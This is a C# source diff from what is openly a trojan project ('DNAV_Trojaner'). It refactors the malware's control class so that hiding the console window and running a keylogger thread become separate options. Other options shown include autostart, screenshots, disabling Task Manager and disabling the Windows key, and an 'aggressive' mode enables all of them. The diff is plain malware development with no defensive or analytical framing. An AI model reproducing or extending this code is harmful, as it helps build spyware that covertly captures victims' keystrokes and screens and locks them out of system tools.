@@ -9,7 +9,8 @@ namespace DNAV_Trojaner
 {
     public class DNAV
     {
-        private bool _keyloggerAndHide;
+        private bool _hide;
+        private bool _keylogger;
         private string _keyloggerLogPath;
         private bool _autostart;
         private bool _screenshots;
@@ -20,18 +21,30 @@ namespace DNAV_Trojaner
         private bool _disableTaskmanager;
         private bool _disableWindowsKey;
 
-        /// <summary>
-        /// Legt fest, ob die Keylogger Funktion aktiviert und das Konsolenfenster versteckt wird.
-        /// </summary>
-        public bool KeyloggerAndHide
+        public bool Hide
         {
             get
             {
-                return this._keyloggerAndHide;
+                return this._hide;
             }
             set
             {
-                this._keyloggerAndHide = value;
+                this._hide = value;
+            }
+        }
+
+        /// <summary>
+        /// Legt fest, ob die Keylogger Funktion aktiviert und das Konsolenfenster versteckt wird.
+        /// </summary>
+        public bool Keylogger
+        {
+            get
+            {
+                return this._keylogger;
+            }
+            set
+            {
+                this._keylogger = value;
             }
         }
 
@@ -175,7 +188,8 @@ namespace DNAV_Trojaner
         /// </summary>
         public DNAV()
         {
-            this.KeyloggerAndHide = false;
+            this.Hide = false;
+            this.Keylogger = false;
             this.KeyloggerLogPath = "log.txt";
             this.Screenshots = false;
             this.ScreenshotsPath = "screen.png";
@@ -192,7 +206,8 @@ namespace DNAV_Trojaner
         /// <param name="aggressive">Wenn gesetzt, sind alle Module aktiviert.</param>
         public DNAV(bool aggressive)
         {
-            this.KeyloggerAndHide = true;
+            this.Hide = true;
+            this.Keylogger = true;
             this.KeyloggerLogPath = "log.txt";
             this.Screenshots = aggressive;
             this.ScreenshotsPath = "screen.png";
@@ -208,9 +223,13 @@ namespace DNAV_Trojaner
         /// </summary>
         public void Start()
         {
-            if (this.KeyloggerAndHide)
+            if (this.Hide)
             {
-                Thread keylogger = new Thread(Keylogger.Enable);
+                DNAV_Trojaner.Keylogger.Hide();
+            }
+            if (this.Keylogger)
+            {
+                Thread keylogger = new Thread(DNAV_Trojaner.Keylogger.Enable);
                 keylogger.Start();
             }
             if (this.Autostart)
